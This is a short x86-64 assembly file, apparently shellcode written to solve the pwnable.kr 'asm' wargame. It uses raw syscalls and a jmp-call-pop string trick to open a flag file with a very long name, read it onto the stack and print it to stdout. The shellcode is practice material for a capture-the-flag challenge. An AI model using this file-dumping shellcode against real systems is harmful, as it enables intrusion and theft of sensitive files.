BITS 64

_start:

	xor rax, rax				;reset registers
	xor rbx, rbx
	xor rdx, rdx
	xor rcx, rcx
	xor rdi, rdi
	xor rsi, rsi
	jmp short load_file_name

	starter:

	mov al, 2					;system call open
	pop rdi						;filename
	xor rsi, rsi 				;flag O_RDONLY
	syscall

	mov rdi, rax				;store fd
	xor rax, rax
	mov al, 0					;system call read
	sub rsp, 150				;allocate space on stack
	mov rsi, rsp				;buffer allocated on the stack
	mov rdx, 100				;count
	syscall

	mov rcx, rax				;store read count
	xor rax, rax
	mov al, 1					;system call write
	xor rdi, rdi
	mov rdi, 1					;fd = stdout
	;rsi is already contains the wanted data to be written
	mov rdx, rcx
	syscall

	xor rax, rax
	mov al, 0x3c				;system call exit
	xor rdi, rdi				;exit status
	syscall


	load_file_name:
    push rcx					;apply null termination
    call starter
    db './this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'